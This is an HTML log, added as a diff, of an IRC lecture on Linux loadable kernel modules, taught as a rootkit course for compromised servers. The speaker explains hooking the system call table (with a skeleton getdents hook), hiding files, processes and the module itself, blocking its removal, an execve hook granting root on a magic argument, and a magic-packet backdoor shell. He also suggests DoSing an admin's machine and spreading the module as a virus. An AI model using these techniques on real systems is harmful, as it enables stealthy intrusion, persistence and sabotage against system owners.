@@ -1,0 +1,679 @@
+<HTML>
+<HEAD>
+      <TITLE>Loadable Kernel Modules [LKM] Lecture</TITLE>
+</HEAD>
+<BODY>
+<br>
+<CENTER>
+<HR SIZE=1 NOSHADE WIDTH="45%">
+Loadable Kernel Modules [LKM] Lecture<br>
+By <a href="mailto:the__unknown_@hotmail.com">Unknown</a><br>
+HTML by <a href="mailto:rammal81@hotmail.com">Mikkkeee</a><br>
+For <A HREF="http://blacksun.box.sk">Blacksun Research Facility
+[BSRF]</A><br>
+
+<A HREF="http://blacksun.box.sk">http://blacksun.box.sk</A><br>
+
+<HR SIZE=1 NOSHADE WIDTH="61%"><br></center>
+
+<P><B>LKM file can be downloaded from <A HREF="http://blacksun.box.sk/mirror/LKM.zip">http://blacksun.box.sk/mirror/LKM.zip</A></B>
+
+<P>&lt;sts|> a zip ???
+<BR>&lt;Mikkkeee> guys the lecture started?
+<BR>&lt;Hijack> 5k
+<BR>&lt;mezzano> it's mikkkeee sup man told you I wouldn't miss this one
+;)
+<BR>&lt;SpiderMan> around 5k
+<BR>&lt;SpiderMan> not large at all
+<BR>&lt;Syrup> anyone know how juno password algorithm works?
+<BR>&lt;Phr3k> small
+<BR>&lt;Mikkkeee> guys the lecture started?
+<BR>&lt;SpiderMan> not yet Mikkkeee
+<BR>&lt;SpiderMan> just told everyone to download the file
+<BR>*** Mikkkeee sets mode: +v unknown
+<BR>&lt;unknown> No it starts now
+<BR>&lt;Revelant-Angel> i can read anything all messages are flying passed
+me
+<BR>*** Retrieving #bsrf info...
+<BR>*** Revelant-Angel has quit IRC (Quit:)
+<BR>&lt;feds> what is it???
+<BR>&lt;Syrup> yay lecture
+<BR>*** DarkneSs has joined #bsrf
+<BR>&lt;Mikkkeee> its a zip unknown set up
+<BR>*** bulgarinche has joined #bsrf
+<BR>&lt;Mikkkeee> http://blacksun.box.sk/mirror/LKM.zip
+<BR>&lt;Phr3k> i dunno what LKM even is
+<BR>&lt;Mikkkeee> loadable kernel modules
+<BR>&lt;unknown> I will explain every thing
+<BR>&lt;freakOVER> don't get excited kids!
+<BR>&lt;freakOVER> :)
+<BR>&lt;feds> hey
+<BR>&lt;feds> me 2!
+<BR>&lt;Mikkkeee> well someone log this too
+<BR>&lt;}{exadecimal> LKM = Loadable Kernel Module
+<BR>*** optimum has quit IRC (Quit: )
+<BR>&lt;Phr3k> is this lecture aplicable to even beginners
+<BR>* freakOVER is loggin
+<BR>&lt;freakOVER> ;)
+<BR>&lt;}{exadecimal> i'm logging Mikkkeee
+<BR>&lt;Phr3k> i'm a beginner beginner
+<BR>&lt;Dustin> obviously
+<BR>*** wascy has joined #bsrf
+<BR>&lt;Mikkkeee> ---------beginning of lecture---------------
+<BR>&lt;feds> any other celeb like u
+<BR>*** Mikkkeee sets mode: +m
+<BR>&lt;Mikkkeee> if anyone wants voice msg an op
+<BR>*** Mikkkeee sets mode: -m
+<BR>&lt;unknown> OK lets start
+<BR>&lt;ControlC> SWEET
+<BR>*** _jacs- is now known as jacs
+<BR>&lt;D|GiTaLM0nKe3> k
+<BR>&lt;wascy> me, pls.
+<BR>&lt;Mikkkeee> wait who wants voice
+<BR>&lt;}{exadecimal> do we need a c compiler? theres a c file in that
+zip
+<BR>&lt;sts|> wich kernelversion?
+<BR>&lt;sts|> 2.2 2.4?
+<BR>&lt;Dustin> i owuld like voice
+<BR>&lt;D|GiTaLM0nKe3> I do
+<BR>&lt;twix> me
+<BR>&lt;Phr3k> i want voice
+<BR>&lt;|StYxX|> no one talk for a sec
+<BR>&lt;wascy> i'd like. thx.
+<BR>&lt;freakOVER> ouch
+<BR>&lt;snider> }{exadecimal: If you use linux you have gcc, if you don't
+use linux the LKM won't compile anyways
+<BR>*** Mikkkeee sets mode: +v Phr3k
+<BR>*** Mikkkeee sets mode: +m
+<BR>&lt;unknown> you need GCC
+<BR>&lt;Mikkkeee> unknown you can begin
+<BR>&lt;unknown> LKM(loadable kernel modules) are used to increase
+<BR>&lt;unknown> the kernel's functionality on run time.
+<BR>*** Mikkkeee sets mode: +v mezzano
+<BR>&lt;unknown> which means you dont have to recompile the entire kernel
+to
+<BR>&lt;unknown> use load it.
+<BR>&lt;unknown> This is why it is used for many device drivers.
+<BR>&lt;unknown> Because LKM are used as part of the kernel it
+<BR>&lt;unknown> give us endless ways to use it for our benifits :)
+<BR>*** SpiderMan has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;freakOVER> are LKMs slower to load?
+<BR>*** SpiderMan has joined #bsrf
+<BR>*** ChanServ sets mode: +o SpiderMan
+<BR>&lt;unknown> Every LKM contains 2 main functions
+<BR>*** h4x0r3d has joined #bsrf
+<BR>&lt;unknown>&nbsp; int init_module(void) and cleanup_module
+<BR>*** jacs has joined #bsrf
+<BR>*** _sokrates- has quit IRC (Quit: Leaving)
+<BR>&lt;unknown> init_module is called when the module is loaded and cleanup_module
+<BR>&lt;unknown> is called when you remove it. init_module should return
+0
+<BR>&lt;unknown> to signal that everything is OK.
+<BR>&lt;unknown> e also must define MODULE and include linux/module.h for
+<BR>&lt;unknown> module configurations,definitions,macros etc.
+<BR>*** Phish has joined #bsrf
+<BR>&lt;unknown> o now we can code our first helloworld LKM
+<BR>&lt;unknown> look at helloworld.c see of you understand everything.
+<BR>&lt;unknown> (it should be easy).
+<BR>&lt;unknown> If u wonder why i used printk and not printf its
+<BR>&lt;unknown> because we are running in kernel mode which
+<BR>&lt;unknown> means we can use restricted set of functions
+<BR>&lt;unknown> A list of useful funcs is in func_list.txt.
+<BR>*** D|GiTaLM0nKe3 has left #bsrf
+<BR>&lt;unknown> questions ?
+<BR>*** snider sets mode: -m
+<BR>&lt;mezzano> that was deep ;)
+<BR>&lt;freakOVER> ya
+<BR>&lt;freakOVER> are LKMs slower to load up than if u just compiled the
+kernel with them?
+<BR>&lt;freakOVER> hey it's just a question :P
+<BR>&lt;unknown> You load it into lernel space in run-time
+<BR>&lt;snider> feds: i'll send the files
+<BR>&lt;sts|> you load them.. then they run like they were compiled into
+the kernel
+<BR>&lt;freakOVER> ah ok
+<BR>&lt;feds> i have them
+<BR>&lt;Hijack> passwords can be captured using the LKM
+<BR>&lt;unknown> Yes
+<BR>&lt;Hijack> have them sent through e-mail
+<BR>&lt;unknown> you can do almost everything using LKM
+<BR>&lt;}{exadecimal> so how do we use the lkm?
+<BR>&lt;unknown> OK
+<BR>&lt;feds> it says it can't find DEVCPP.exe
+<BR>&lt;unknown> So let continue
+<BR>&lt;suspect> lol
+<BR>&lt;Mikkkeee> unknown would these files run as vxd files?
+<BR>&lt;Dustin> unknown: but they would need to RUN your lkm first to steal
+passes?
+<BR>&lt;SpiderMan> feds: just open it up in notepad for now
+<BR>&lt;unknown> So lets continue
+<BR>*** snider sets mode: +m
+<BR>&lt;freakOVER> feds: open it using notepad
+<BR>&lt;unknown> You can also hack the sever and load it yourself
+<BR>&lt;unknown> It almost like VxD but in linux
+<BR>&lt;Mikkkeee> are you going to give us an example in real time?
+<BR>&lt;unknown> Yes
+<BR>&lt;Mikkkeee> man vxd hacking is hot
+<BR>*** Dustin has left #bsrf
+<BR>&lt;unknown> So compile helloworld.c with gcc -O3 -c helloworld.c
+<BR>*** pitpat has joined #bsrf
+<BR>&lt;unknown> This will create helloworld.o
+<BR>*** Syrup has quit IRC (Quit:)
+<BR>&lt;unknown> to insert the LKM do "insmod helloworld.o"
+<BR>*** dg-2 has quit IRC (Quit: )
+<BR>&lt;unknown> Now do lsmod
+<BR>&lt;unknown> this will list the modules loaded into the kernel
+<BR>&lt;unknown> Later we will see how to make our LKM
+<BR>&lt;unknown> Unremovabe &amp; invisible
+<BR>&lt;unknown> to remove it do "rmmod helloworld"
+<BR>&lt;unknown> questions?
+<BR>*** DG-2 has joined #bsrf
+<BR>&lt;unknown> questions?
+<BR>&lt;mezzano> nope seems pretty intuitive ;)
+<BR>&lt;unknown> KO
+<BR>&lt;unknown> OK
+<BR>*** SpiderMan sets mode: -m
+<BR>&lt;Hijack> so is there any solutions for removing it if i were a system
+admin
+<BR>&lt;}{exadecimal> no voice
+<BR>&lt;Hijack> ?
+<BR>&lt;unknown> OK now because our LKM is running in kernel space
+<BR>&lt;unknown> we cant access user space memory.
+<BR>&lt;unknown> So lets say one of our functions gets as
+<BR>&lt;unknown> an argument a pointer to user space
+<BR>&lt;unknown> we must move it to kernel space before we try
+<BR>&lt;unknown> to use data it points to.
+<BR>&lt;_miketr0nix-> hello
+<BR>*** SpiderMan sets mode: +m
+<BR>&lt;unknown> to use data it points to.
+<BR>&lt;unknown> He can remove it on run-time he can restart the box
+<BR>&lt;unknown> so the module will not be loaded
+<BR>*** Mikkkeee sets mode: +o unknown
+<BR>*** ChanServ sets mode: -o unknown
+<BR>&lt;Mikkkeee> shit
+<BR>&lt;unknown> but first he has to find it
+<BR>* mezzano thinks mikkkeee needs to pimp-slap chanserv ;)
+<BR>&lt;unknown> If you what you can put some script to insmod it when
+the box starts
+<BR>&lt;unknown> In order to move user data to ke rnel data we have several
+functions
+<BR>*** ControlC has quit IRC (Quit: )
+<BR>&lt;unknown> get_user(kernel_dest,user_pointer) - gets the value user_pointer
+points to
+<BR>&lt;unknown> and put it in kernel_dest(old kernels use dest=get_user(src)).
+<BR>&lt;unknown> put_user(kernel_src,user_pointer) - note that kernel_src
+<BR>&lt;unknown> is not a pointer)
+<BR>&lt;unknown> copy_from_user(kernel_dest_ptr,src_ptr,size)
+<BR>&lt;unknown> copy_to_user(user_dest_ptr,src_ptr,size)
+<BR>*** DG-2 has quit IRC (Quit: Leaving)
+<BR>*** pitpat has quit IRC (Quit: )
+<BR>*** Mikkkeee sets mode: +o unknown
+<BR>*** optimum has joined #bsrf
+<BR>&lt;unknown> For example look at _h_lkm.c at line 78
+<BR>*** suspect has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;unknown> this function copies string from user
+<BR>*** Dustin has joined #bsrf
+<BR>&lt;unknown> (GET_U is a macro for get_user())
+<BR>&lt;unknown> questions ?
+<BR>*** [phRoZen] has joined #BSRF
+<BR>*** SpiderMan sets mode: -m
+<BR>&lt;Hijack> none at the moment
+<BR>*** optimum is now known as optimum[d
+<BR>&lt;Neophyte> im fine
+<BR>&lt;}{exadecimal> yeah
+<BR>*** zaxil has joined #bsrf
+<BR>&lt;zaxil> hey everyone
+<BR>&lt;}{exadecimal> why do we keep losing our voices?
+<BR>*** bulgarinche has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;unknown> OK lets continue
+<BR>&lt;Neophyte> he sets moderation
+<BR>&lt;Mikkkeee> cause you interupt
+<BR>*** optimum[d is now known as optimum[downloading]
+<BR>&lt;i-o> the printk, where can i see it??
+<BR>&lt;}{exadecimal> i know what he does but why
+<BR>*** Mikkkeee sets mode: +m
+<BR>&lt;unknown> Moving on to symbol table.
+<BR>&lt;unknown> The symbol table is a file found in /proc/ksyms which
+contains exported
+<BR>&lt;unknown> kernel symbols(functions for example) that can be used
+<BR>&lt;unknown> by our LKM and kernel.
+<BR>&lt;unknown> The reason we should care about this file is that it will
+also contain
+<BR>&lt;unknown> our LKM functions so a good admin will be able to spot
+<BR>&lt;unknown> our LKM. It can also be used by us to spot and admin LKM
+<BR>*** Drager has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;unknown> If he monitors the entire system with some super LKM
+<BR>&lt;unknown>&nbsp; we should reconsider our actions).
+<BR>&lt;unknown> BTW If you encounter and detect this kind of LKM try
+<BR>&lt;unknown> to DoS the machine and make it restart many admins
+<BR>&lt;unknown> dont activate the LKM's on init.
+<BR>*** count_chocula has joined #bsrf
+<BR>&lt;unknown> Anyway to control the exported symbols all have to do
+is to
+<BR>&lt;unknown> is to use macros defined in module.h (in old kernel
+<BR>&lt;unknown> we need to include /linux/symtab_begin.h and
+<BR>&lt;unknown> use register_symtab(NULL) if we dont want to
+<BR>&lt;unknown> export symbols).
+<BR>*** _Altus- has joined #bsrf
+<BR>&lt;unknown> The macros are 'EXPORT_NO_SYMBOLS' if dont want to export
+<BR>&lt;unknown> symbols.
+<BR>&lt;unknown> If we want to export something define EXPORT_SYMTAB
+<BR>&lt;unknown> and use 'EXPORT_SYMBOL(name)' macro.
+<BR>&lt;unknown> questions?
+<BR>*** Mikkkeee sets mode: -m
+<BR>&lt;feds> is it works on win kernel?
+<BR>&lt;unknown> No
+<BR>&lt;Mikkkeee> no
+<BR>&lt;SpiderMan> no, for windows use VxDs
+<BR>&lt;feds> dam
+<BR>&lt;Mikkkeee> vxds can be discovered
+<BR>&lt;feds> where do i get it?
+<BR>&lt;mezzano> strictly *nix baby ;)
+<BR>&lt;Hijack> the same manner can be applied in window s vxds
+<BR>&lt;Dustin> vxd == lkm for win?
+<BR>&lt;unknown> OK lets continue
+<BR>&lt;Mikkkeee> yah
+<BR>&lt;Hijack> yes , very true
+<BR>&lt;feds> where can i get it?
+<BR>*** Mikkkeee sets mode: +m
+<BR>&lt;unknown> Now the interesting part - system calls
+<BR>&lt;unknown> Every OS has built in functions that are used for every
+operation
+<BR>&lt;unknown> on the system in linux those functions are called system
+calls.
+<BR>&lt;unknown> So if we control the system calls we can control the entire
+<BR>&lt;unknown> system.
+<BR>&lt;unknown> To see a list of all the system calls look in
+<BR>&lt;unknown> look in /usr/include/bits/syscall.h(or run a search for
+<BR>&lt;unknown> syscall.h).
+<BR>&lt;unknown> so lets say we want to find which system call
+<BR>&lt;unknown> is used to list files(which system call is used by ls).
+<BR>&lt;unknown> Do 'strace ls'.
+<BR>&lt;unknown> strace will give you all the system calls used by ls.
+<BR>&lt;unknown> Most of the functions are obvious and many repeat many
+times
+<BR>&lt;unknown> but look at getdents it shows only twice and the second
+<BR>&lt;unknown> argument stats "* entries" if you check this is
+<BR>&lt;unknown> the number of files + folders + hidden files
+<BR>&lt;unknown> in the folder.
+<BR>&lt;unknown> * is a number
+<BR>&lt;unknown> So we can assume that this is the system call.
+<BR>&lt;unknown> Now the next step is to try to 'man getdents'.
+<BR>&lt;unknown> Getdents has manual entry so it explains what it
+<BR>&lt;unknown> does and we were right :)
+<BR>*** Norton has joined #bsrf
+<BR>&lt;unknown> If there isnt man entry you can search the kernel sources
+<BR>&lt;unknown> (you should always search the sources to see how something
+works
+<BR>&lt;unknown>&nbsp; before replacing it).
+<BR>&lt;unknown> Next we will replace it and modify it to hide every file
+or folder
+<BR>&lt;unknown> that starts with _h_.
+<BR>&lt;unknown> questions?
+<BR>*** SpiderMan sets mode: -m
+<BR>&lt;_miketr0nix-> hi
+<BR>&lt;Dustin> yes
+<BR>&lt;_miketr0nix-> i have a question
+<BR>&lt;Dustin> getdents is a program like strace?
+<BR>*** XarZ has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;_miketr0nix-> i want to know things about how to stop my ping
+<BR>&lt;unknown> getdents is a system call
+<BR>&lt;_miketr0nix-> but i am in windows
+<BR>&lt;Mikkkeee> stop your ping?
+<BR>&lt;_miketr0nix-> yes
+<BR>&lt;zaxil> get a firewall to blok them
+<BR>&lt;_miketr0nix-> like someone is trying to ping me
+<BR>&lt;Dustin> lets save this for another time, shall we?
+<BR>&lt;unknown> strace can be used to out which functions are used
+<BR>*** _miketr0nix- has quit IRC (Quit: )
+<BR>&lt;Norton> heh
+<BR>&lt;unknown> strace can be used to fing out which functions are used
+<BR>&lt;Hijack> unknown
+<BR>*** fatboyjoe has joined #bsrf
+<BR>&lt;snider> i have a q..
+<BR>&lt;unknown> by a program
+<BR>&lt;Dustin> then what is getdents for
+<BR>&lt;Hijack> one question before i leave , which is not related to LKM
+<BR>&lt;unknown> getdents is used to get a list of files and folder from
+<BR>&lt;unknown> a directory
+<BR>&lt;unknown> ls uses it to get its data
+<BR>&lt;snider> unknown: i use kernel 2.4.1 which is too old to load that
+helloworld module.. how come? how can the system see that its been written
+for a newer kernel version?
+<BR>&lt;Dustin> oh ls uses a syscall called 'getdents'?
+<BR>&lt;Hijack>&nbsp; will the topic ACK Tunnelling be brought up in future
+lectures?
+<BR>&lt;Mikkkeee> yah
+<BR>*** zaxil has quit IRC (Quit:)
+<BR>&lt;unknown> Dustin: yes
+<BR>&lt;Dustin> ok, it becomes clear
+<BR>&lt;Mikkkeee> hijack maybe in the later weeks
+<BR>&lt;unknown> So if we will replace getdents system call we can hide
+files
+<BR>&lt;Hijack> thanks mikkkeee , it s the seccond attack which i fear
+most behind LKM / VxD hacking
+<BR>&lt;Mikkkeee> hehe ack tunneling
+<BR>*** _fatboyjoe- has quit IRC (Ping timeout: 180 seconds)
+<BR>*** Hijack has quit IRC (Quit: )
+<BR>&lt;unknown> and process (since processes are listed in /proc)
+<BR>&lt;unknown> and processes (since processes are listed in /proc)
+<BR>&lt;h4x0r3d> heh
+<BR>&lt;unknown> So lets continue
+<BR>&lt;Dustin> oh, so getdents() could be programmed to leave out files
+that begin in !
+<BR>&lt;unknown> yes
+<BR>&lt;Dustin> ok, plz continue
+<BR>&lt;unknown> thats our purpose
+<BR>*** Mikkkeee sets mode: +m
+<BR>&lt;unknown> To intercept system calls you need to know that the kernel
+<BR>&lt;unknown> exports a table that lists all the system calls.
+<BR>&lt;unknown> The var is 'void *sys_call_table[]'.
+<BR>&lt;unknown> Each entry in this array is a pointer to a system call.
+<BR>&lt;unknown> You can look in syscall.h to find its number.
+<BR>&lt;unknown> So if we want to replace getdents system call we can
+<BR>&lt;unknown> use this code:
+<BR>&lt;unknown> ...
+<BR>&lt;unknown> extern void *sys_call_table[];
+<BR>&lt;unknown> int (*o_getdents)(unsigned int,struct dirent *,unsigned
+int);
+<BR>&lt;unknown> int h_getdents("same vars"){
+<BR>&lt;unknown>&nbsp;&nbsp;&nbsp;&nbsp; your code
+<BR>&lt;unknown> }
+<BR>&lt;unknown> ...
+<BR>&lt;unknown> int init_module(){
+<BR>&lt;unknown> ...
+<BR>&lt;unknown> o_getdents = sys_call_table[SYS_getdents];
+<BR>&lt;unknown> sys_call_table[SYS_getdents] = h_getdents;
+<BR>&lt;Phr3k> excellent
+<BR>&lt;unknown> ...
+<BR>&lt;unknown> }
+<BR>&lt;unknown> void cleanup_module(){
+<BR>&lt;unknown> ...
+<BR>&lt;unknown> sys_call_table[SYS_getdents] = o_getdents;
+<BR>&lt;unknown> ...
+<BR>&lt;unknown> }
+<BR>&lt;unknown> We need to save the original system call because we might
+<BR>&lt;unknown> use it and because we need to restore it when
+<BR>&lt;unknown> we remove the module (unless ou want to fuck up the system
+<BR>&lt;unknown> Questions?
+<BR>*** SpiderMan sets mode: -m
+<BR>&lt;mezzano> so after loading this LKM then all susequent file listing
+requests would exclude those we don't want them to see then correct?
+<BR>&lt;unknown> Yes if code it properly
+<BR>&lt;unknown> Yes if u code it properly
+<BR>&lt;Dustin> this is all well and good, but wouldnt you need root access
+to load a lkm?
+<BR>&lt;Dustin> and if you had root whqats the point
+<BR>&lt;snider> what is the purpose of&nbsp;&nbsp;&nbsp; o_getdents = sys_call_table[SYS_getdents];&nbsp;
+?
+<BR>&lt;Dustin> of going thru all the trouble
+<BR>&lt;freakOVER> well if u had gotten into a system
+<BR>&lt;freakOVER> for like
+<BR>&lt;freakOVER> a backdoor
+<BR>&lt;unknown> Dustin: Lets say you want to put a sniffer
+<BR>&lt;snider> oh.. nevermind me
+<BR>&lt;unknown> on the system and make it totaly invisible
+<BR>*** JamesBONG has joined #bsrf
+<BR>&lt;Dustin> ok point taken
+<BR>&lt;Dustin> oyu cant to that with a program cause a task mgr would
+list it
+<BR>&lt;freakOVER> mmhmm
+<BR>&lt;JamesBONG> does anybody here use macs?
+<BR>&lt;unknown> what?
+<BR>&lt;h4x0r3d> lol
+<BR>&lt;Mikkkeee> hehe no
+<BR>&lt;freakOVER> $ jobs
+<BR>&lt;freakOVER> maybe might list it
+<BR>&lt;Dustin> yeah
+<BR>*** rs has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;freakOVER> or another prog that lists tasks
+<BR>&lt;freakOVER> LKMs aren't listed as jobs right?
+<BR>&lt;Dustin> top
+<BR>&lt;Dustin> ps
+<BR>&lt;freakOVER> just processes maybe?
+<BR>*** Norton has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;unknown> top and ps wont list it
+<BR>&lt;Dustin> why not
+<BR>&lt;Mikkkeee> what can list them then
+<BR>&lt;snider> because its not a userspace program
+<BR>&lt;Mikkkeee> third party program?
+<BR>&lt;snider> lsmod lists the loaded kernel modules
+<BR>&lt;freakOVER> ahh
+<BR>&lt;Dustin> wait, are we talking about a lkm sniffer or a 'real' sniffer
+<BR>&lt;unknown> Because we will make the kernel do it
+<BR>&lt;Dustin> ok
+<BR>&lt;unknown> i will get to that later
+<BR>&lt;freakOVER> ok ok i think i'm gettin' this
+<BR>&lt;unknown> a real sniffer
+<BR>&lt;Dustin> so to disguise from lsmod you would put the lkm sniffer
+piggybacked with getdents or something
+<BR>&lt;unknown> What i will do is to replace getdents and query_module
+system calls
+<BR>*** suspect has joined #bsrf
+<BR>&lt;unknown> so they will remove the what we want from the list
+<BR>&lt;unknown> OK?
+<BR>&lt;Dustin> you do need root access first to do all this right?
+<BR>&lt;Dustin> ok
+<BR>&lt;snider> yeah, but then after you can hide files from the *right*
+root of the box
+<BR>&lt;Mikkkeee> yup
+<BR>&lt;Dustin> ok
+<BR>&lt;freakOVER> heehee
+<BR>&lt;freakOVER> deviousness!
+<BR>&lt;unknown> You can also spread it as a virus
+<BR>&lt;unknown> but will get to that
+<BR>*** snider sets mode: +m
+<BR>&lt;unknown> SO lets continue
+<BR>&lt;Mikkkeee> wait can you write a worm to do this for u?
+<BR>*** Guy_SJS has joined #bsrf
+<BR>*** ChanServ sets mode: +o Guy_SJS
+<BR>&lt;unknown> you can intercept DCC or FTP sessions
+<BR>&lt;unknown> and add code for executalbes
+<BR>&lt;unknown> so it will be loaded when the file executed by root
+<BR>*** SpiderMan has quit IRC (Ping timeout: 180 seconds)
+<BR>*** DElTa_SquaD has joined #bsrf
+<BR>*** SpiderMan has joined #bsrf
+<BR>*** ChanServ sets mode: +o SpiderMan
+<BR>&lt;unknown> u can c how to hide files on line 172 in _h_lkm.c
+<BR>*** dataholic has joined #bsrf
+<BR>*** ChanServ sets mode: +v dataholic
+<BR>&lt;unknown> Some of the code there is used to hide processes i will
+explain it later
+<BR>&lt;unknown> I also replaced chdir system call so in order
+<BR>&lt;unknown> to execute or read files from hidden folders
+<BR>&lt;unknown> you must give full path.
+<BR>&lt;unknown> Try to read it if you got questions ask
+<BR>&lt;unknown> I commented most of the code so it will be easy to understand
+<BR>&lt;unknown> questions?
+<BR>&lt;Phr3k> i gotta go
+<BR>&lt;mezzano> none yet...the code is pretty easy to read &lt;IMHO>
+<BR>&lt;Phr3k> someone send me log later
+<BR>*** Phr3k has quit IRC (Quit: )
+<BR>&lt;unknown> OK so lets continue
+<BR>&lt;dataholic> wait wait
+<BR>* dataholic lights up a cigg
+<BR>* dataholic puts on a nice mp3
+<BR>&lt;dataholic> ok go with tha flow!
+<BR>&lt;dataholic> :)
+<BR>&lt;unknown> As you know /proc contains a folder named with
+<BR>&lt;unknown> the process id for each process.
+<BR>&lt;unknown> To list process with 'ps' for example
+<BR>&lt;unknown> ps goes through the /proc dir.
+<BR>&lt;unknown> So If we want to hide a process
+<BR>&lt;unknown> we check if a process goes through /proc
+<BR>&lt;unknown> folder so we need to look for the pid of the process we
+want to hide
+<BR>&lt;unknown> and remove from the list getdents returns.
+<BR>&lt;unknown> :)
+<BR>* Guy_SJS bums a cig off dataholic
+<BR>&lt;dataholic> lol
+<BR>&lt;Mikkkeee> heh
+<BR>&lt;unknown> the /proc&nbsp; folder contains PID's
+<BR>&lt;unknown> To do it we need to get the inode in which getdents
+<BR>&lt;unknown> is suppose to scan and if its /proc recover the task name
+of
+<BR>&lt;unknown> each pid and if it starts with _h_ remove it from the
+list.
+<BR>&lt;unknown> To get the inode we will use the 'current' pointer
+<BR>&lt;unknown> which points to data of the current process (that issused
+the call)
+<BR>&lt;unknown> and its definition is 'struct task_struct *current'(to
+see
+<BR>&lt;unknown> struct task_struct look in linux/sched.h).
+<BR>&lt;unknown> PROC_ROOT_INO is the inode of /proc and its defined in
+linux/proc_fs.h.
+<BR>&lt;unknown> The MAJOR and MINOR macros are used to check if it the
+right device
+<BR>&lt;unknown> I will explain more about major and minor numbers in
+<BR>&lt;unknown> the 'coding LKM devices' lecture.
+<BR>&lt;unknown> Go through the source if you got questions ask.
+<BR>*** DElTa_SquaD has joined #bsrf
+<BR>&lt;unknown> Questions?
+<BR>&lt;Guy_SJS> ok
+<BR>*** Mikkkeee sets mode: -m
+<BR>&lt;Guy_SJS> wow
+<BR>&lt;Guy_SJS> long lecture
+<BR>&lt;Dustin> can you kill a process by rmdir /proc/911
+<BR>&lt;h4x0r3d> when will the 'coding LKM devices' be?
+<BR>&lt;Mikkkeee> next week
+<BR>&lt;Mikkkeee> maybe
+<BR>&lt;h4x0r3d> ok, =]
+<BR>&lt;Dustin> if rmdir is a cmd ;0
+<BR>&lt;h4x0r3d> heh
+<BR>*** DElTa_SquaD has left #bsrf
+<BR>&lt;Dustin> rm -r
+<BR>&lt;h4x0r3d> well, thanx man, ima go now, peace all!
+<BR>&lt;dataholic> y'all evil minded ppl :))))
+<BR>*** h4x0r3d has quit IRC (Quit: i luv box.sk)
+<BR>&lt;Dustin> suckup
+<BR>&lt;Mikkkeee> lol
+<BR>&lt;Guy_SJS> rm -rf /home/dataholc
+<BR>&lt;freakOVER> he loves the server
+<BR>&lt;freakOVER> i wanna hit him :(
+<BR>&lt;Guy_SJS> hope u had a backup.
+<BR>&lt;dataholic> lol
+<BR>&lt;dataholic> to dev/null with you!
+<BR>&lt;unknown> OK lets continue
+<BR>&lt;Guy_SJS> lol
+<BR>*** mezzano has quit IRC (Quit: )
+<BR>*** Mikkkeee sets mode: +m
+<BR>&lt;unknown> so we have hidden our files,folders and processes
+<BR>&lt;unknown> but the admin can still see our lkm using lsmod
+<BR>&lt;unknown> and remove it. There are several methods to
+<BR>&lt;unknown> hide our modules.
+<BR>&lt;unknown> One of them (suggested in Phrack 52) is
+<BR>&lt;unknown> to manipulate struct module and set the size,refs and
+<BR>&lt;unknown> the name of the module to 0. But when i tried it
+<BR>&lt;unknown> it didnt work(I think it works only with old kernel,
+<BR>&lt;unknown> other wise the kernel is loaded but when you lsmod
+<BR>&lt;unknown> some errors occur).
+<BR>&lt;unknown> Another way is to intercept sys_query_module system call
+<BR>&lt;unknown> you can strace lsmod to see it.
+<BR>&lt;unknown> Its easy to implement(almost like getdents).
+<BR>&lt;unknown> Look at it in line 321 in _h_lkm.c.
+<BR>&lt;unknown> To make it unremovable look intercept int delete_module(char
+*name)
+<BR>&lt;unknown> and if name is the matches the LKM name return -ENOENT
+<BR>&lt;unknown> which means the module is not loaded.
+<BR>&lt;unknown> Questions?
+<BR>&lt;snider> brilliant
+<BR>*** snider sets mode: -m
+<BR>&lt;Dustin> devious little schemer you
+<BR>&lt;unknown> No questions? so lets continue
+<BR>&lt;freakOVER> RAWR
+<BR>&lt;freakOVER> i'm hungry :(
+<BR>&lt;freakOVER> but linux is sexier :\
+<BR>&lt;dataholic> lol
+<BR>*** Mikkkeee sets mode: +m
+<BR>&lt;unknown> Another cool idea from phrack is redirection of execve
+<BR>&lt;unknown> for example let say you what that every
+<BR>&lt;unknown> time login is executed it will execute you login instead
+<BR>&lt;unknown> so what you is replacing execve and each time login is
+<BR>&lt;unknown> called you call /hiddenpath/my_login.
+<BR>&lt;unknown> But ididnt implement it in this module
+<BR>&lt;unknown> A few notes about execve.
+<BR>&lt;unknown> To replace execve you must put it in some other
+<BR>&lt;unknown> place in the sys_call_table(I put it in the end
+<BR>&lt;unknown> but you can loop and look for the first NULL)
+<BR>&lt;unknown> and modify the registers before calling it
+<BR>&lt;unknown> since it expects the data in specific registers.
+<BR>&lt;unknown> I wrote an asm code to do it in my LKM.
+<BR>&lt;unknown> If anyone knows a better way to do it please
+<BR>&lt;unknown> share.
+<BR>&lt;unknown> I dont recall which line
+<BR>&lt;unknown> look for it
+<BR>&lt;snider> 260
+<BR>&lt;unknown> What it does is wait till sh is executed and if the last
+<BR>&lt;unknown> argument is ___h___ then it gives you root
+<BR>&lt;unknown> Someother ideas could be preventing SYS_write from
+<BR>&lt;unknown> writing certain IPs, make your file
+<BR>&lt;unknown> totaly unaccessable by replacing open system calls
+<BR>&lt;unknown> unless you have magic uid, record every thing
+<BR>&lt;unknown> the admin does and many other things be creative!!!
+<BR>&lt;unknown> TTY hijacking is a cool thing to do.
+<BR>&lt;unknown> (I will show how to it in my next lecture)
+<BR>&lt;unknown> Questions?
+<BR>*** snider sets mode: -m
+<BR>&lt;jacs> l
+<BR>&lt;snider> i guess not
+<BR>*** stenas has joined #bsrf
+<BR>&lt;unknown> another important system call is socket(int call,unsigned
+long *args)).
+<BR>&lt;unknown> I didnt implemented it due to a lack of time but i will
+<BR>&lt;unknown> explain how it works.
+<BR>&lt;unknown> The socket system call handles all the socket operations
+<BR>&lt;unknown> (recv,send,connect etc.). Its call argument is the type
+<BR>&lt;unknown> of action.
+<BR>&lt;unknown> One thing you can do with it is to intercept
+<BR>&lt;unknown> RECVFROM call and wait for a packet with
+<BR>&lt;unknown> magic size and magic content and then
+<BR>&lt;unknown> open a shell on some port to get root.
+<BR>&lt;unknown> This idea is implemented by plaguez in Phrack 52.
+<BR>&lt;unknown> But this kind of backdoor will not work
+<BR>&lt;unknown> if there a firewall on the system.
+<BR>&lt;Dustin> unless oyu have physical access
+<BR>*** royanee has quit IRC (Quit: )
+<BR>&lt;unknown> Sure
+<BR>&lt;unknown> but you can overcome this
+<BR>*** stenas is now known as royanee
+<BR>&lt;unknown> For example you can look for packet that contain
+<BR>&lt;unknown> some string lets say &lt;123Order321>
